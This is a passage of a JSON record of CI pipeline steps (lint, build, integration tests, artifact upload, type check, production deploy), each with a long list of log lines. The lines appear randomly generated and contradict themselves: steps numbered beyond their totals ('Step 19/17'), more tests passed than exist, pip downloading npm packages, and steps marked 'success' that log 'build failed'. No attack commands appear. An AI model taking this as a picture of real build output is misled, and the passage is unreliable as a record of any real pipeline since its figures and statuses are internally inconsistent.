          "[12:18:54] DEBUG: Connection pool: 19 active",
          "[12:18:54] DEBUG: Initializing service",
          "Using Python 3.11",
          "Environment: test",
          "Connection established",
          "[12:18:54] DEBUG: Loading configuration",
          "Environment: staging",
          "Step 18/21: Installing dependencies",
          "\u2713 Step 'checkout' succeeded",
          "[12:18:54] ERROR: Connection failed",
          "NODE_ENV=production",
          "Compiling src/main.py...",
          "Platform: win32-x64",
          "[12:18:54] DEBUG: Loading configuration",
          "Loading...",
          "Coverage: 90% statements, 62% branches",
          "NODE_ENV=test",
          "yarn add: Done in 5.36s",
          "Compiling src/index.js...",
          "Compiling src/handler.rs...",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "Step 19/17: Linting",
          "[12:18:54] INFO: Processing request",
          "[12:18:54] WARN: Deprecated API usage",
          "Step 15/15: Installing dependencies",
          "Using Node.js 17.20.5",
          "[12:18:54] DEBUG: Initializing service",
          "Waiting...",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "[12:18:54] DEBUG: Connection pool: 1 active",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "npm notice: created a lockfile",
          "Using Python 3.11",
          "Fetching submodules...",
          "Platform: win32-x64",
          "Using Python 3.9",
          "Cache invalidated: node_modules",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "Image pulled successfully",
          "pip: Downloading lodash-5.14.tar.gz",
          "Cache miss for key-9396",
          "Loading...",
          "Image pulled successfully",
          "Image pulled successfully",
          "Step 12/23: Installing dependencies",
          "[12:18:54] DEBUG: Memory usage: 1716MB",
          "Optimizing 47 modules...",
          "Done.",
          "Step 9/15: Deploying",
          "[12:18:54] WARN: Deprecated API usage",
          "WARNING: lodash has known vulnerabilities",
          "[12:18:54] DEBUG: Memory usage: 218MB",
          "[12:18:54] INFO: Request completed",
          "Using Python 3.10",
          "Step 19/17: Testing",
          "Ready.",
          "Connection established",
          "[12:18:54] WARN: Deprecated API usage",
          "Compiling lib/service.java...",
          "Compiling utils/index.js...",
          "[12:18:54] INFO: Cache refreshed",
          "Using Node.js 15.16.5",
          "Installing react@1.15.6",
          "npm install: resolved 327 packages",
          "Environment: development",
          "pip: Downloading lodash-2.1.tar.gz",
          "Time: 95.325s",
          "  PASS: e2e/test_cache_hit.spec.js",
          "yarn add: Done in 10.71s",
          "Using Node.js 19.2.6",
          "Compiling components/app.ts...",
          "Checking out develop branch",
          "  PASS: e2e/test_api_health.spec.js",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "Done.",
          "Generating source maps...",
          "npm install: added 435 packages",
          "Optimizing 15 modules...",
          "GET /health - 201 (41ms)",
          "[12:18:54] INFO: Processing request",
          "Finished.",
          "Exception: TypeError",
          "POST /data - 201 (94ms)",
          "pip: Downloading webpack-3.14.tar.gz",
          "FAILED: test_db_connect",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "Step 1/22: Running migrations",
          "Connecting to cloud.services:443...",
          "Uploading artifact 'coverage' (12 files)",
          "[12:18:54] INFO: Processing request",
          "Tests: 414 passed, 125 total",
          "Step 17/18: Deploying",
          "Environment: development",
          "[12:18:54] WARN: Deprecated API usage",
          "Image pulled successfully",
          "Loading...",
          "Completed.",
          "Finished.",
          "Minifying vendor.js",
          "Cache miss for key-8361",
          "Time: 10.464s",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "Step 16/15: Running migrations",
          "Minifying main.js",
          "npm install: resolved 1293 packages",
          "Optimizing 38 modules...",
          "Environment: test",
          "WARNING: express has known vulnerabilities",
          "Verifying...",
          "Fetching submodules...",
          "Building Docker image...",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "POST /data - 201 (229ms)",
          "\u2713 Task completed in 626ms",
          "npm notice: package.json updated",
          "[12:18:54] DEBUG: Query executed in 62ms",
          "Finished.",
          "Artifact downloaded: 23MB",
          "Compiling utils/index.js...",
          "[12:18:54] WARN: Deprecated API usage",
          "Transforming 610 files...",
          "Processing...",
          "npm notice: package.json updated",
          "Step 19/24: Deploying",
          "Image pulled successfully",
          "\u2713 Step 'build' succeeded",
          "Connection established",
          "Environment: staging",
          "[12:18:54] INFO: Cache refreshed",
          "Image pulled successfully",
          "[12:18:54] INFO: Cache refreshed",
          "HEAD is now at 7162cb4",
          "GET /health - 204 (4ms)",
          "npm install: added 118 packages",
          "Environment: development",
          "Platform: win32-x64",
          "\u2717 build failed with exit code 16",
          "[12:18:54] WARN: Deprecated API usage",
          "Completed.",
          "Ready.",
          "OK",
          "Generating source maps...",
          "Environment: test",
          "Uploading artifact 'build' (8 files)",
          "pip: Installing build dependencies...",
          "Pushing to registry...",
          "Test Suites: 50 passed, 12 total",
          "[12:18:54] INFO: Request completed",
          "[12:18:54] INFO: Connecting to database",
          "[12:18:54] DEBUG: Query executed in 61ms",
          "Compiling src/main.py...",
          "pip: Installing build dependencies...",
          "[12:18:54] DEBUG: Connection pool: 1 active",
          "Cache miss for key-3787",
          "Minifying main.js",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "Artifact downloaded: 49MB",
          "POST /api - 200 (85ms)",
          "WARNING: jest has known vulnerabilities",
          "OK",
          "=== Step lint completed ==="
        ]
      },
      {
        "name": "build",
        "status": "success",
        "started_at": "2025-11-23T12:20:03.490961",
        "finished_at": "2025-11-23T12:20:32.463617",
        "log_lines": [
          "=== Step: build ===",
          "[12:18:54] DEBUG: Initializing service",
          "Cache saved successfully",
          "TLS handshake completed",
          "Cache saved successfully",
          "Exception: NullPointerException",
          "Cache saved successfully",
          "Verifying...",
          "Cache miss for key-5753",
          "NODE_ENV=production",
          "Pushing to registry...",
          "Loading...",
          "Cache miss for key-6848",
          "Pushing to registry...",
          "Verifying...",
          "OK",
          "pip: Installing build dependencies...",
          "Compiling lib/index.js...",
          "Installing jest@3.16.5",
          "Uploading artifact 'coverage' (4 files)",
          "POST /data - 201 (449ms)",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "NODE_ENV=production",
          "Pushing to registry...",
          "[12:18:54] INFO: Cache refreshed",
          "Compiling utils/app.ts...",
          "pip install: Successfully installed eslint-4.3",
          "Done.",
          "Time: 31.699s",
          "Connecting to example.com:443...",
          "TLS handshake completed",
          "\u2713 All checks passed",
          "Compiling src/index.js...",
          "[12:18:54] INFO: Cache refreshed",
          "npm notice: created a lockfile",
          "Artifact downloaded: 10MB",
          "Artifact uploaded: dist.zip (58MB)",
          "GET /status - 201 (4ms)",
          "WARNING: eslint has known vulnerabilities",
          "pip: Downloading webpack-1.16.tar.gz",
          "npm notice: created a lockfile",
          "[12:18:54] WARN: Deprecated API usage",
          "Cache invalidated: node_modules",
          "[12:18:54] DEBUG: Loading configuration",
          "pip: Collecting axios",
          "  PASS: unit/test_db_connect.spec.js",
          "Image pulled successfully",
          "WARNING: webpack has known vulnerabilities",
          "\u2713 All checks passed",
          "Time: 7.180s",
          "Cache miss for key-9694",
          "pip: Installing build dependencies...",
          "pip: Downloading jest-1.6.tar.gz",
          "[12:18:54] WARN: Deprecated API usage",
          "GET /status - 201 (74ms)",
          "Completed.",
          "Done.",
          "Step 1/18: Building",
          "Using Python 3.10",
          "Waiting...",
          "NODE_ENV=test",
          "npm install: resolved 1266 packages",
          "npm install: added 489 packages",
          "yarn add: Done in 24.10s",
          "npm notice: created a lockfile",
          "Finished.",
          "[12:18:54] WARN: Deprecated API usage",
          "Uploading artifact 'dist' (31 files)",
          "Bundling vendor.js",
          "GET /status - 204 (67ms)",
          "Optimizing 52 modules...",
          "Transforming 120 files...",
          "[12:18:54] DEBUG: Memory usage: 306MB",
          "Creating production build...",
          "Minifying vendor.js",
          "\u2713 deploy completed",
          "npm notice: created a lockfile",
          "yarn add: Done in 17.96s",
          "POST /api - 201 (483ms)",
          "WARNING: jest has known vulnerabilities",
          "npm install: resolved 1888 packages",
          "Artifact uploaded: dist.zip (32MB)",
          "Switched to branch 'bugfix/task-851'",
          "Compiling lib/service.java...",
          "Compiling lib/index.js...",
          "Loading...",
          "Step 10/20: Linting",
          "Success!",
          "  PASS: integration/test_cache_hit.spec.js",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "Connecting to example.com:443...",
          "Minifying app.js",
          "Cache invalidated: build",
          "Artifact uploaded: dist.zip (34MB)",
          "[12:18:54] WARN: Deprecated API usage",
          "[12:18:54] INFO: Connecting to database",
          "Optimizing 85 modules...",
          "Test Suites: 11 passed, 33 total",
          "Waiting...",
          "Ran 14 tests in 15s",
          "[12:18:54] DEBUG: Loading configuration",
          "Compiling components/main.py...",
          "pip install: Successfully installed eslint-1.17",
          "[12:18:54] WARN: Deprecated API usage",
          "[12:18:54] DEBUG: Initializing service",
          "[12:18:54] INFO: Connecting to database",
          "[12:18:54] WARN: Deprecated API usage",
          "Coverage: 92% statements, 93% branches",
          "Step 10/23: Testing",
          "Loading...",
          "[12:18:54] INFO: Cache refreshed",
          "Processing...",
          "[12:18:54] WARN: Deprecated API usage",
          "Step 1/24: Linting",
          "Pushing to registry...",
          "Bundling vendor.css",
          "Using Node.js 19.20.5",
          "Exception: NullPointerException",
          "\u2713 Task completed in 2739ms",
          "[12:18:54] WARN: Deprecated API usage",
          "Using Node.js 19.9.8",
          "Verifying...",
          "Cache saved successfully",
          "[12:18:54] INFO: Cache refreshed",
          "Compiling src/service.java...",
          "[12:18:54] INFO: Connecting to database",
          "GET /health - 201 (32ms)",
          "[12:18:54] DEBUG: Loading configuration",
          "Compiling src/app.ts...",
          "Using Python 3.9",
          "Finished.",
          "Artifact uploaded: dist.zip (31MB)",
          "Already up to date.",
          "Pushing to registry...",
          "[12:18:54] WARN: Deprecated API usage",
          "Done.",
          "Compiling components/service.java...",
          "Image pulled successfully",
          "Pulling image: alpine:latest",
          "POST /upload - 201 (195ms)",
          "Snapshots: 39 passed, 8 total",
          "\u2713 All checks passed",
          "Waiting...",
          "Verifying...",
          "Snapshots: 22 passed, 39 total",
          "Artifact downloaded: 29MB",
          "[12:18:54] DEBUG: Query executed in 20ms",
          "Compiling utils/app.ts...",
          "Cache hit for key-4666",
          "Done.",
          "Connection established",
          "Image pulled successfully",
          "[12:18:54] DEBUG: Loading configuration",
          "npm install: resolved 148 packages",
          "Switched to branch 'bugfix/task-211'",
          "WARNING: webpack has known vulnerabilities",
          "Pulling image: python:latest",
          "\u2713 Step 'checkout' succeeded",
          "  PASS: test_auth_login (287ms)",
          "Installing axios@3.8.3",
          "Coverage: 91% statements, 79% branches",
          "Layer 6/11: RUN command",
          "Bundling styles.css",
          "[12:18:54] INFO: Cache refreshed",
          "Artifact uploaded: dist.zip (36MB)",
          "Pushing to registry...",
          "[12:18:54] DEBUG: Initializing service",
          "Test Suites: 37 passed, 33 total",
          "Cache miss for key-6875",
          "Checking out main branch",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "npm install: resolved 1671 packages",
          "=== Step build completed ==="
        ]
      },
      {
        "name": "integration_tests",
        "status": "success",
        "started_at": "2025-11-23T12:20:32.463617",
        "finished_at": "2025-11-23T12:20:51.778721",
        "log_lines": [
          "=== Step: integration_tests ===",
          "Step 10/22: Installing dependencies",
          "Fetching submodules...",
          "Building Docker image...",
          "Environment: development",
          "\u2713 All checks passed",
          "Loading...",
          "HEAD is now at 28fefd4",
          "Using Python 3.9",
          "WARNING: react has known vulnerabilities",
          "[12:18:54] INFO: Cache refreshed",
          "pip install: Successfully installed eslint-2.10",
          "Step 9/23: Running migrations",
          "  PASS: e2e/test_user_create.spec.js",
          "Layer 4/8: RUN command",
          "Coverage: 95% statements, 85% branches",
          "\u2713 All checks passed",
          "Artifact uploaded: dist.zip (69MB)",
          "Optimizing 39 modules...",
          "[12:18:54] DEBUG: Query executed in 45ms",
          "Success!",
          "Connecting to startup.dev:443...",
          "[12:18:54] DEBUG: Connection pool: 20 active",
          "Cache saved successfully",
          "FAILED: test_user_create",
          "FAILED: test_db_connect",
          "\u2717 build failed with exit code 87",
          "Platform: darwin-arm64",
          "  PASS: test_api_health (84ms)",
          "Image pulled successfully",
          "Image pulled successfully",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "Cache restored successfully (59MB)",
          "Compiling src/handler.rs...",
          "yarn add: Done in 18.14s",
          "Using Node.js 18.12.9",
          "pip: Downloading jest-3.5.tar.gz",
          "pip: Downloading prettier-5.0.tar.gz",
          "HEAD is now at 3ec9f88",
          "Step 13/18: Running migrations",
          "npm notice: created a lockfile",
          "TLS handshake completed",
          "Compiling src/service.java...",
          "Artifact uploaded: dist.zip (51MB)",
          "Artifact uploaded: build.tar.gz (3MB)",
          "Step 19/16: Testing",
          "Artifact uploaded: build.tar.gz (30MB)",
          "[12:18:54] DEBUG: Initializing service",
          "Environment: staging",
          "Building Docker image...",
          "Building Docker image...",
          "Connecting to example.com:443...",
          "npm notice: package.json updated",
          "POST /api - 201 (14ms)",
          "Loading...",
          "Environment: test",
          "WARNING: webpack has known vulnerabilities",
          "Snapshots: 43 passed, 11 total",
          "Test Suites: 9 passed, 16 total",
          "\u2713 All checks passed",
          "npm notice: package.json updated",
          "[12:18:54] WARN: Deprecated API usage",
          "Done.",
          "pip: Installing build dependencies...",
          "[12:18:54] INFO: Processing request",
          "[12:18:54] INFO: Connecting to database",
          "TLS handshake completed",
          "Completed.",
          "[12:18:54] INFO: Cache refreshed",
          "Cache miss for key-4611",
          "npm notice: package.json updated",
          "Platform: linux-x64",
          "Done.",
          "Step 9/20: Deploying",
          "Ready.",
          "Snapshots: 23 passed, 47 total",
          "Snapshots: 43 passed, 15 total",
          "Ran 106 tests in 4s",
          "POST /api - 201 (23ms)",
          "\u2713 Task completed in 934ms",
          "Step 5/19: Building",
          "[12:18:54] DEBUG: Loading configuration",
          "[12:18:54] ERROR: Connection failed",
          "Processing...",
          "GET /api - 201 (63ms)",
          "Environment: staging",
          "Cache hit for key-7244",
          "Connection established",
          "Test Suites: 35 passed, 37 total",
          "Bundling vendor.css",
          "WARNING: axios has known vulnerabilities",
          "[12:18:54] INFO: Cache refreshed",
          "Installing axios@5.12.9",
          "\u2713 All checks passed",
          "Installing eslint@2.6.5",
          "Exception: ValueError",
          "Connecting to acme.corp:443...",
          "Cache restored successfully (323MB)",
          "[12:18:54] INFO: Cache refreshed",
          "Generating source maps...",
          "[12:18:54] DEBUG: Query executed in 40ms",
          "  PASS: test_user_create (110ms)",
          "pip: Downloading webpack-5.4.tar.gz",
          "Environment: staging",
          "Processing...",
          "Coverage: 80% statements, 63% branches",
          "Layer 7/10: COPY command",
          "Building Docker image...",
          "npm install: resolved 1414 packages",
          "Compiling src/app.ts...",
          "NODE_ENV=test",
          "WARNING: jest has known vulnerabilities",
          "[12:18:54] DEBUG: Initializing service",
          "Coverage: 93% statements, 80% branches",
          "Optimizing 67 modules...",
          "Artifact uploaded: build.tar.gz (12MB)",
          "[12:18:54] INFO: Starting build process",
          "\u2713 Task completed in 2765ms",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "Cache miss for key-6487",
          "[12:18:54] ERROR: Connection failed",
          "Minifying app.js",
          "Transforming 807 files...",
          "[12:18:54] INFO: Processing request",
          "Minifying vendor.js",
          "Generating source maps...",
          "HEAD is now at 2f856df",
          "pip install: Successfully installed react-5.6",
          "\u2713 All checks passed",
          "Done.",
          "Cache hit for key-7323",
          "Cache invalidated: node_modules",
          "[12:18:54] DEBUG: Memory usage: 1260MB",
          "Processing...",
          "Finished.",
          "[12:18:54] DEBUG: Query executed in 72ms",
          "Ran 97 tests in 20s",
          "  PASS: test_db_connect (108ms)",
          "npm notice: created a lockfile",
          "[12:18:54] INFO: Processing request",
          "Waiting...",
          "WARNING: express has known vulnerabilities",
          "Ran 167 tests in 17s",
          "Artifact uploaded: build.tar.gz (45MB)",
          "Ready.",
          "\u2713 Task completed in 1992ms",
          "Verifying...",
          "Tests: 67 passed, 446 total",
          "npm notice: package.json updated",
          "Exception: TypeError",
          "Time: 72.233s",
          "Uploading artifact 'build' (15 files)",
          "Artifact uploaded: dist.zip (64MB)",
          "Tests: 433 passed, 410 total",
          "Completed.",
          "\u2713 All checks passed",
          "OK",
          "WARNING: prettier has known vulnerabilities",
          "  PASS: test_user_create (393ms)",
          "Connecting to test.io:443...",
          "Cache restored successfully (295MB)",
          "Completed.",
          "Environment: development",
          "Environment: production",
          "NODE_ENV=development",
          "Creating production build...",
          "Step 2/21: Deploying",
          "\u2713 Step 'setup' succeeded",
          "Step 9/17: Installing dependencies",
          "NODE_ENV=test",
          "Checking out master branch",
          "Generating source maps...",
          "=== Step integration_tests completed ==="
        ]
      },
      {
        "name": "upload_artifacts",
        "status": "success",
        "started_at": "2025-11-23T12:20:51.778721",
        "finished_at": "2025-11-23T12:21:01.436273",
        "log_lines": [
          "=== Step: upload_artifacts ===",
          "Platform: linux-x64",
          "Loading...",
          "Compiling src/app.ts...",
          "[12:18:54] DEBUG: Loading configuration",
          "Artifact uploaded: dist.zip (63MB)",
          "Ran 168 tests in 29s",
          "Already up to date.",
          "Connecting to test.io:443...",
          "[12:18:54] DEBUG: Initializing service",
          "\u2713 Task completed in 681ms",
          "Environment: staging",
          "Step 5/22: Building",
          "Using Node.js 20.12.4",
          "\u2713 deploy completed",
          "Step 19/25: Deploying",
          "[12:18:54] WARN: Deprecated API usage",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "Completed.",
          "Generating source maps...",
          "Step 14/25: Testing",
          "Platform: win32-x64",
          "Creating production build...",
          "\u2717 build failed with exit code 14",
          "Cache miss for key-4756",
          "pip: Downloading prettier-5.17.tar.gz",
          "Cache restored successfully (175MB)",
          "Switched to branch 'feature/task-920'",
          "Artifact uploaded: build.tar.gz (22MB)",
          "Uploading artifact 'dist' (34 files)",
          "Image pulled successfully",
          "GET /health - 204 (22ms)",
          "Step 16/23: Running migrations",
          "[12:18:54] DEBUG: Memory usage: 1116MB",
          "Creating production build...",
          "Image pulled successfully",
          "Installing react@5.16.1",
          "Cache hit for key-2540",
          "Finished.",
          "Ready.",
          "  PASS: test_cache_hit (124ms)",
          "FAILED: test_cache_hit",
          "Loading...",
          "[12:18:54] ERROR: Connection failed",
          "Building Docker image...",
          "Finished.",
          "WARNING: axios has known vulnerabilities",
          "Step 18/25: Installing dependencies",
          "Artifact downloaded: 38MB",
          "Step 7/17: Building",
          "pip: Downloading webpack-2.18.tar.gz",
          "Pulling image: node:3.11",
          "[12:18:54] WARN: Deprecated API usage",
          "[12:18:54] INFO: Connecting to database",
          "pip: Installing build dependencies...",
          "Artifact uploaded: build.tar.gz (47MB)",
          "OK",
          "Environment: staging",
          "WARNING: react has known vulnerabilities",
          "[12:18:54] WARN: Deprecated API usage",
          "Transforming 254 files...",
          "  PASS: test_db_connect (79ms)",
          "  PASS: e2e/test_auth_login.spec.js",
          "Image pulled successfully",
          "Finished.",
          "pip: Installing build dependencies...",
          "Step 16/16: Testing",
          "Verifying...",
          "Snapshots: 36 passed, 40 total",
          "Already up to date.",
          "Already up to date.",
          "Artifact uploaded: build.tar.gz (7MB)",
          "[12:18:54] INFO: Request completed",
          "Using Node.js 14.2.4",
          "Pulling image: python:latest",
          "yarn add: Done in 28.94s",
          "Compiling src/utils.go...",
          "pip: Downloading lodash-2.12.tar.gz",
          "Environment: staging",
          "[12:18:54] INFO: Processing request",
          "WARNING: prettier has known vulnerabilities",
          "Completed.",
          "Installing prettier@2.10.6",
          "GET /api - 201 (83ms)",
          "Platform: win32-x64",
          "FAILED: test_db_connect",
          "[12:18:54] DEBUG: Initializing service",
          "[12:18:54] WARN: Deprecated API usage",
          "[12:18:54] INFO: Connecting to database",
          "[12:18:54] INFO: Connecting to database",
          "Time: 98.847s",
          "NODE_ENV=development",
          "Generating source maps...",
          "Environment: staging",
          "yarn add: Done in 15.65s",
          "Uploading artifact 'dist' (5 files)",
          "OK",
          "Environment: staging",
          "Tests: 242 passed, 468 total",
          "Cache saved successfully",
          "Generating source maps...",
          "Step 11/22: Linting",
          "\u2713 package completed",
          "[12:18:54] WARN: Deprecated API usage",
          "GET /api - 201 (70ms)",
          "Pulling image: python:3.11",
          "\u2713 All checks passed",
          "  PASS: unit/test_auth_login.spec.js",
          "[12:18:54] INFO: Cache refreshed",
          "[12:18:54] DEBUG: Connection pool: 1 active",
          "Image pulled successfully",
          "Exception: TypeError",
          "Cache invalidated: build",
          "FAILED: test_cache_hit",
          "Environment: test",
          "Exception: TypeError",
          "[12:18:54] DEBUG: Memory usage: 1470MB",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "pip install: Successfully installed prettier-2.10",
          "Cache miss for key-5499",
          "Time: 90.52s",
          "npm notice: package.json updated",
          "Image pulled successfully",
          "Ready.",
          "pip: Installing build dependencies...",
          "\u2717 build failed with exit code 38",
          "Ready.",
          "Pulling image: python:18",
          "Test Suites: 20 passed, 30 total",
          "Cache restored successfully (190MB)",
          "Step 1/23: Installing dependencies",
          "Compiling lib/service.java...",
          "[12:18:54] DEBUG: Query executed in 64ms",
          "npm install: resolved 1795 packages",
          "[12:18:54] ERROR: Connection failed",
          "Using Python 3.10",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "[12:18:54] INFO: Starting build process",
          "Building Docker image...",
          "pip: Installing build dependencies...",
          "Time: 103.974s",
          "Compiling utils/service.java...",
          "Step 11/19: Linting",
          "npm notice: created a lockfile",
          "Snapshots: 31 passed, 28 total",
          "yarn add: Done in 17.22s",
          "Step 13/24: Building",
          "[12:18:54] INFO: Connecting to database",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "[12:18:54] INFO: Request completed",
          "Artifact uploaded: build.tar.gz (10MB)",
          "POST /api - 200 (164ms)",
          "npm notice: created a lockfile",
          "\u2713 Step 'test' succeeded",
          "Using Python 3.12",
          "Fetching submodules...",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "GET /api - 200 (9ms)",
          "Artifact uploaded: build.tar.gz (1MB)",
          "Using Node.js 16.7.5",
          "Using Python 3.10",
          "OK",
          "Already up to date.",
          "pip: Installing build dependencies...",
          "npm notice: created a lockfile",
          "\u2713 Task completed in 4019ms",
          "  PASS: integration/test_user_create.spec.js",
          "Optimizing 91 modules...",
          "Building Docker image...",
          "npm install: added 414 packages",
          "Done.",
          "=== Step upload_artifacts completed ==="
        ]
      },
      {
        "name": "type_check",
        "status": "success",
        "started_at": "2025-11-23T12:21:01.436273",
        "finished_at": "2025-11-23T12:21:11.093825",
        "log_lines": [
          "=== Step: type_check ===",
          "[12:18:54] INFO: Processing request",
          "[12:18:54] INFO: Cache refreshed",
          "Already up to date.",
          "[12:18:54] WARN: Deprecated API usage",
          "Platform: linux-x64",
          "Exception: ValueError",
          "Uploading artifact 'build' (15 files)",
          "Checking out main branch",
          "Cache invalidated: build",
          "NODE_ENV=development",
          "Transforming 801 files...",
          "Layer 2/15: RUN command",
          "TLS handshake completed",
          "npm install: resolved 1030 packages",
          "Compiling src/app.ts...",
          "Optimizing 52 modules...",
          "\u2713 All checks passed",
          "\u2713 Step 'setup' succeeded",
          "pip: Collecting react",
          "Exception: RuntimeError",
          "Loading...",
          "Connecting to startup.dev:443...",
          "Image pulled successfully",
          "TLS handshake completed",
          "pip install: Successfully installed webpack-3.9",
          "  PASS: test_db_connect (470ms)",
          "Artifact uploaded: dist.zip (82MB)",
          "[12:18:54] WARN: Deprecated API usage",
          "Already up to date.",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "\u2713 build completed",
          "Verifying...",
          "Compiling utils/service.java...",
          "[12:18:54] INFO: Processing request",
          "\u2713 All checks passed",
          "Compiling utils/utils.go...",
          "[12:18:54] WARN: Deprecated API usage",
          "GET /api - 204 (86ms)",
          "Pushing to registry...",
          "Success!",
          "Tests: 449 passed, 144 total",
          "Generating source maps...",
          "Pulling image: alpine:3.11",
          "GET /status - 204 (67ms)",
          "npm install: added 301 packages",
          "Processing...",
          "[12:18:54] DEBUG: Loading configuration",
          "Uploading artifact 'dist' (30 files)",
          "\u2713 build completed",
          "Platform: linux-x64",
          "Checking out main branch",
          "pip: Collecting express",
          "Uploading artifact 'build' (39 files)",
          "Ready.",
          "\u2713 Step 'checkout' succeeded",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "Step 14/25: Running migrations",
          "Step 1/21: Installing dependencies",
          "Step 12/25: Testing",
          "pip: Collecting express",
          "Exception: RuntimeError",
          "npm install: resolved 354 packages",
          "Finished.",
          "Processing...",
          "npm install: resolved 1556 packages",
          "Fetching submodules...",
          "[12:18:54] DEBUG: Query executed in 38ms",
          "Ran 50 tests in 57s",
          "Test Suites: 48 passed, 43 total",
          "Loading...",
          "pip: Collecting eslint",
          "Tests: 87 passed, 339 total",
          "[12:18:54] DEBUG: Memory usage: 440MB",
          "Layer 8/12: ENV command",
          "[12:18:54] DEBUG: Connection pool: 14 active",
          "GET /status - 201 (38ms)",
          "[12:18:54] INFO: Starting build process",
          "[12:18:54] WARN: Deprecated API usage",
          "Layer 1/8: RUN command",
          "[12:18:54] DEBUG: Query executed in 78ms",
          "Platform: linux-x64",
          "Using Node.js 18.12.2",
          "Artifact uploaded: build.tar.gz (1MB)",
          "pip: Downloading eslint-2.13.tar.gz",
          "Fetching submodules...",
          "  PASS: e2e/test_cache_hit.spec.js",
          "Uploading artifact 'dist' (16 files)",
          "TLS handshake completed",
          "[12:18:54] DEBUG: Initializing service",
          "[12:18:54] INFO: Cache refreshed",
          "\u2713 Task completed in 1851ms",
          "\u2713 Step 'setup' succeeded",
          "\u2713 deploy completed",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "TLS handshake completed",
          "Ready.",
          "[12:18:54] DEBUG: Loading configuration",
          "Installing axios@4.11.7",
          "[12:18:54] ERROR: Connection failed",
          "POST /api - 200 (233ms)",
          "[12:18:54] DEBUG: Memory usage: 1706MB",
          "Step 6/24: Building",
          "Creating production build...",
          "POST /api - 202 (292ms)",
          "[12:18:54] ERROR: Connection failed",
          "Cache miss for key-3945",
          "[12:18:54] WARN: Deprecated API usage",
          "\u2713 Task completed in 4271ms",
          "Ready.",
          "npm notice: created a lockfile",
          "Checking out master branch",
          "  PASS: integration/test_db_connect.spec.js",
          "Completed.",
          "[12:18:54] ERROR: Connection failed",
          "Cache restored successfully (490MB)",
          "Compiling src/service.java...",
          "Installing react@5.19.6",
          "Using Python 3.10",
          "Snapshots: 2 passed, 18 total",
          "Uploading artifact 'dist' (33 files)",
          "Pushing to registry...",
          "Test Suites: 39 passed, 41 total",
          "Done.",
          "Using Node.js 18.18.0",
          "TLS handshake completed",
          "Step 1/17: Deploying",
          "Layer 10/9: RUN command",
          "[12:18:54] WARN: Deprecated API usage",
          "Minifying app.js",
          "Environment: production",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "\u2713 All checks passed",
          "Ran 137 tests in 58s",
          "Ran 22 tests in 28s",
          "pip: Installing build dependencies...",
          "Compiling components/utils.go...",
          "Creating production build...",
          "POST /data - 200 (225ms)",
          "HEAD is now at c3c7cd4",
          "Artifact uploaded: dist.zip (47MB)",
          "Cache miss for key-2780",
          "Step 2/18: Deploying",
          "[12:18:54] DEBUG: Initializing service",
          "[12:18:54] INFO: Request completed",
          "Using Node.js 16.4.5",
          "Finished.",
          "TLS handshake completed",
          "GET /api - 200 (61ms)",
          "[12:18:54] WARN: Deprecated API usage",
          "\u2713 validate completed",
          "npm notice: package.json updated",
          "Pushing to registry...",
          "Artifact uploaded: build.tar.gz (39MB)",
          "Time: 33.935s",
          "OK",
          "FAILED: test_auth_login",
          "Time: 106.891s",
          "Creating production build...",
          "\u2713 All checks passed",
          "Uploading artifact 'build' (3 files)",
          "Cache hit for key-2850",
          "Cache saved successfully",
          "[12:18:54] DEBUG: Query executed in 70ms",
          "Connecting to test.io:443...",
          "Pushing to registry...",
          "Compiling components/service.java...",
          "[12:18:54] DEBUG: Initializing service",
          "Finished.",
          "Generating source maps...",
          "[12:18:54] INFO: Processing request",
          "Generating source maps...",
          "=== Step type_check completed ==="
        ]
      },
      {
        "name": "deploy_production",
        "status": "success",
        "started_at": "2025-11-23T12:21:11.093825",
        "finished_at": "2025-11-23T12:21:14.956846",
        "log_lines": [
          "=== Step: deploy_production ===",
          "  PASS: test_api_health (278ms)",
          "[12:18:54] INFO: Request completed",
          "Loading...",
          "Cache invalidated: dependencies",
          "\u2713 Task completed in 1633ms",
          "  PASS: e2e/test_db_connect.spec.js",
          "Pulling image: python:latest",
          "Platform: linux-x64",
          "[12:18:54] INFO: Starting build process",
          "Success!",
          "OK",
          "Step 20/22: Linting",
          "Transforming 601 files...",
          "Loading...",
          "[12:18:54] WARN: Deprecated API usage",
          "Installing express@1.0.1",
          "[12:18:54] DEBUG: Connection pool: 12 active",
          "pip: Collecting react",
          "Step 3/20: Testing",
          "Time: 15.245s",
          "Test Suites: 46 passed, 15 total",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "\u2713 Task completed in 1997ms",
          "npm install: added 201 packages",
          "\u2713 Step 'test' succeeded",
          "[12:18:54] DEBUG: Loading configuration",
          "Pulling image: alpine:3.11",
          "Switched to branch 'feature/task-433'",
          "Compiling lib/service.java...",
          "Building Docker image...",
          "Compiling src/handler.rs...",
          "npm install: added 171 packages",
          "Completed.",
          "TLS handshake completed",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "Artifact uploaded: dist.zip (12MB)",
          "pip: Installing build dependencies...",
          "Using Python 3.10",
          "Compiling src/main.py...",
          "Generating source maps...",
          "Artifact uploaded: dist.zip (16MB)",
